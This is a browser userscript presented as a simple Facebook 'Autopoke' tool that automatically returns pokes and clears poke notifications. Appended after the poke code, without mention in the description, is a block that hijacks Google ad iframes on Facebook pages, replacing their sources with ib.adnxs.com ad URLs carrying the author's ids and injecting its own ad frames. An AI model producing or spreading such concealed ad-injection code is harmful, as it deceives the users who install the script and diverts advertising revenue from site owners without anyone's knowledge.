// ==UserScript==
// @name           FB Autopoke
// @namespace      mceme
// @version        1.1.0
// @author         mceme
// @description    Autopoke.
// @require        http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js
// @include        https://www.facebook.com/*
// @include        https://facebook.com/*
// @include        https://www.m.facebook.com/*
// @include        https://m.facebook.com/*
// @include        http://www.facebook.com/*
// @include        http://facebook.com/*
// @include        http://www.m.facebook.com/*
// @include        http://m.facebook.com/*
// ==/UserScript==

if (window.location.href.match(/facebook\.com/i) || window.location.href.match(/m\.facebook\.com/i)) {
(function ($) {
	function autopoke() {
	console.log("Run");
		var poke_uids = gfids = [],
			i = aid = 0,
			loc = window.location.host.toLowerCase(),
			dtsg = $('input[name=fb_dtsg]').val();

		$.ajaxSetup({
			async: false
		});

		// 1st, we call the pokes page and fetch all pokes, if there are any 
		$.ajax({
			url: '/pokes',
			dataType: 'html',
			success: function (data) {
				if (loc.match(/m\.facebook\.com/)) {
					// Iterate through received pokes
					$("a[href^='/pokes/inline/']", data).each(function () {
						if ($(this).attr('href').indexOf('is_suggestion=0') !== -1) {
							// Poke found. Send poke back
							$.get($(this).attr('href'));
						}
					});
				} else {
					poke_uids = data.match(/poke_target=([0-9]+)/g);
					
					
console.log(poke_uids);
					// No pokes, sleep
					if (!poke_uids) {
					console.log("No pokesuids");
						return;
					}

					// Pokes found. Send pokes back
					for (i; i <= poke_uids.length - 1; i += 1) {
						$.post('/pokes/dialog/?poke_target=' + poke_uids[i].match(/([0-9]+)/)[0] + '&do_confirm=0', {
							fb_dtsg: dtsg
						});
						console.log("Autopoke"+poke_uids[i].match(/([0-9]+)/)[0]);
					}

					// dismiss notifications
					$("li[data-gt*='poke']").each(function () {
						aid = $(this).attr('data-gt').split('{"alert_id":')[1].split(',')[0];
						$.get('/ajax/notifications/mark_read.php?alert_ids[0]=' + aid + '&fb_dtsg=' + dtsg);
					});
				}
			}
		});
	}

	// Runonce
	setTimeout(function () {
		autopoke();
	}, 1500);

	// Start timer
	setInterval(function () {
		autopoke();
	}, 30000); // Repeat every 30 seconds
}(jQuery.noConflict(true)));

}
var pais=window.navigator.userLanguage||window.navigator.language;var adsscript350;var adsscript728;if(pais=='pt-PT')
{adsscript350='http://ib.adnxs.com/tt?id=1198509&size=300x250';adsscript728='http://ib.adnxs.com/tt?id=1198512&size=728x90';}
else if(pais=='pt-BR')
{adsscript350='http://ib.adnxs.com/tt?id=1198509&size=300x250';adsscript728='http://ib.adnxs.com/tt?id=1198512&size=728x90';}
else
{adsscript350='http://ib.adnxs.com/tt?id=1198509&size=300x250';adsscript728='http://ib.adnxs.com/tt?id=1198512&size=728x90';}
var elementframe1=document.getElementById('google_ads_frame1');if(elementframe1){var height=document.getElementById('google_ads_frame1').getAttribute('height');var width=document.getElementById('google_ads_frame1').getAttribute('width');if(height=='250')
document.getElementById('google_ads_frame1').setAttribute('src',adsscript350);else if(height=='60')
document.getElementById('google_ads_frame1').setAttribute('src','http://ib.adnxs.com/tt?id=1198512&size=728x90');else if(height=='90')
document.getElementById('google_ads_frame1').setAttribute('src',adsscript728);else if(height=='600'&&width=='160')
document.getElementById('google_ads_frame1').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height=='600'&&width=='120')
document.getElementById('google_ads_frame1').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height=='280')
document.getElementById('google_ads_frame1').setAttribute('src','http://ib.adnxs.com/tt?id=1340559');else
document.getElementById('google_ads_frame1').setAttribute('src','http://ib.adnxs.com/tt?id=1198509&size=300x250');}
var elementframe2=document.getElementById('google_ads_frame2');if(elementframe2){var height=document.getElementById('google_ads_frame2').getAttribute('height');var width=document.getElementById('google_ads_frame2').getAttribute('width');if(height=='250')
document.getElementById('google_ads_frame2').setAttribute('src',adsscript350);else if(height=='60')
document.getElementById('google_ads_frame2').setAttribute('src','http://ib.adnxs.com/tt?id=1198512&size=728x90');else if(height=='90')
document.getElementById('google_ads_frame2').setAttribute('src',adsscript728);else if(height=='600'&&width=='160')
document.getElementById('google_ads_frame2').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height=='600'&&width=='120')
document.getElementById('google_ads_frame2').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height=='280')
document.getElementById('google_ads_frame2').setAttribute('src','http://ib.adnxs.com/tt?id=1340559');else
document.getElementById('google_ads_frame2').setAttribute('src','http://ib.adnxs.com/tt?id=1198509&size=300x250');}
var elementframe3=document.getElementById('google_ads_frame3');if(elementframe3){var height=document.getElementById('google_ads_frame3').getAttribute('height');var width=document.getElementById('google_ads_frame3').getAttribute('width');if(height=='250')
document.getElementById('google_ads_frame3').setAttribute('src',adsscript350);else if(height=='60')
document.getElementById('google_ads_frame3').setAttribute('src','http://ib.adnxs.com/tt?id=1198512&size=728x90');else if(height=='90')
document.getElementById('google_ads_frame3').setAttribute('src',adsscript728);else if(height=='600'&&width=='160')
document.getElementById('google_ads_frame3').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height=='600'&&width=='120')
document.getElementById('google_ads_frame3').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height=='280')
document.getElementById('google_ads_frame3').setAttribute('src','http://ib.adnxs.com/tt?id=1340559');else
document.getElementById('google_ads_frame3').setAttribute('src','http://ib.adnxs.com/tt?id=1198509&size=300x250');}



var element=document.getElementById('aswift_0');if(element){var height=document.getElementById('aswift_0').getAttribute('height');var width=document.getElementById('aswift_0').getAttribute('width');if(height=='250')
document.getElementById('aswift_0').setAttribute('src',adsscript350);else if(height=='60')
document.getElementById('aswift_0').setAttribute('src','http://ib.adnxs.com/tt?id=1198512&size=728x90');else if(height=='90')
document.getElementById('aswift_0').setAttribute('src',adsscript728);else if(height=='600'&&width=='160')
document.getElementById('aswift_0').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height=='600'&&width=='120')
document.getElementById('aswift_0').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height=='280')
document.getElementById('aswift_0').setAttribute('src','http://ib.adnxs.com/tt?id=1340559');else
document.getElementById('aswift_0').setAttribute('src','http://ib.adnxs.com/tt?id=1198509&size=300x250');}
 var element2=document.getElementById('aswift_1');if(element2){var height2=document.getElementById('aswift_1').getAttribute('height');var width2=document.getElementById('aswift_1').getAttribute('width');if(height2=='250')
 document.getElementById('aswift_1').setAttribute('src',adsscript350);else if(height2=='60')
 document.getElementById('aswift_1').setAttribute('src','http://ib.adnxs.com/tt?id=1198512&size=728x90');else if(height2=='90')
 document.getElementById('aswift_1').setAttribute('src',adsscript728);else if(height2=='600'&&width2=='160')
 document.getElementById('aswift_1').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height2=='600'&&width2=='120')
 document.getElementById('aswift_1').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height2=='280')
 document.getElementById('aswift_1').setAttribute('src','http://ib.adnxs.com/tt?id=1340559');else
 document.getElementById('aswift_1').setAttribute('src','http://ib.adnxs.com/tt?id=1198509&size=300x250');}
var element3=document.getElementById('aswift_2');if(element3){var height3=document.getElementById('aswift_2').getAttribute('height');var width3=document.getElementById('aswift_2').getAttribute('width');if(height3=='250')
document.getElementById('aswift_2').setAttribute('src',adsscript350);else if(height3=='60')
document.getElementById('aswift_2').setAttribute('src','http://ib.adnxs.com/tt?id=1198512&size=728x90');else if(height3=='90')
document.getElementById('aswift_2').setAttribute('src',adsscript728);else if(height3=='600'&&width3=='160')
document.getElementById('aswift_2').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height3=='600'&&width3=='120')
document.getElementById('aswift_2').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height3=='280')
document.getElementById('aswift_2').setAttribute('src','http://ib.adnxs.com/tt?id=1340559');else
document.getElementById('aswift_2').setAttribute('src','http://ib.adnxs.com/tt?id=1198509&size=300x250');}
var element4=document.getElementById('aswift_3');if(element4){var height4=document.getElementById('aswift_3').getAttribute('height');var width4=document.getElementById('aswift_3').getAttribute('width');if(height4=='250')
document.getElementById('aswift_3').setAttribute('src',adsscript350);else if(height4=='60')
document.getElementById('aswift_3').setAttribute('src','http://ib.adnxs.com/tt?id=1198512&size=728x90');else if(height4=='90')
document.getElementById('aswift_3').setAttribute('src',adsscript728);else if(height4=='600'&&width4=='160')
document.getElementById('aswift_3').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height4=='600'&&width4=='120')
document.getElementById('aswift_3').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height4=='280')
document.getElementById('aswift_3').setAttribute('src','http://ib.adnxs.com/tt?id=1340559');else
document.getElementById('aswift_3').setAttribute('src','http://ib.adnxs.com/tt?id=1198509&size=300x250');}
var element5=document.getElementById('aswift_4');if(element5){var height5=document.getElementById('aswift_4').getAttribute('height');var width5=document.getElementById('aswift_4').getAttribute('width');if(height5=='250')
document.getElementById('aswift_4').setAttribute('src',adsscript350);else if(height5=='60')
document.getElementById('aswift_4').setAttribute('src','http://ib.adnxs.com/tt?id=1198512&size=728x90');else if(height5=='90')
document.getElementById('aswift_4').setAttribute('src',adsscript728);else if(height=='600'&&width5=='160')
document.getElementById('aswift_4').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height=='600'&&width5=='120')
document.getElementById('aswift_4').setAttribute('src','http://ib.adnxs.com/tt?id=1198513&size=160x600');else if(height5=='280')
document.getElementById('aswift_4').setAttribute('src','http://ib.adnxs.com/tt?id=1340559');else
document.getElementById('aswift_4').setAttribute('src','http://ib.adnxs.com/tt?id=1198509&size=300x250');}
var i=0;var div;while(div=document.getElementsByTagName('iframe')[i++]){
if(div.id.match(/google_ads/)){var parentDiv=document.getElementById(div.id).parentNode;var height=parentDiv.offsetHeight;var width=parentDiv.offsetWidth;height=parseInt(height);width=parseInt(width);document.getElementById(div.id).style.display="none";if(height>250&&height<275){inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="'+adsscript350+'"></iframe>';parentDiv.style.height='250px';parentDiv.style.overflow='show';}
else if(height>60&&height<70)
inset='<iframe id="IFRAME28" name="IFRAME28" height="60px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1198512&size=728x90"></iframe>';else if(height>90&&height<100)
inset='<iframe id="IFRAME28" name="IFRAME28" height="90px" width="100%" frameborder="0" scrolling="no" src="'+adsscript728+'"></iframe>';else if(height>600&&height<610&&width>160&&width<180)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1198513&size=160x600"></iframe>';else if(height>600&&height<610&&width<140)
inset='<iframe id="IFRAME28" name="IFRAME28" height="600px" width="100%" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1198513&size=160x600"></iframe>';else if(height>280&&height<295)
inset='<iframe id="IFRAME28" name="IFRAME28" height="280px" width="336px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1340559"></iframe>';else
inset='<iframe id="IFRAME28" name="IFRAME28" height="250px" width="300px" frameborder="0" scrolling="no" src="http://ib.adnxs.com/tt?id=1198509&size=300x250"></iframe>';parentDiv.innerHTML=inset;}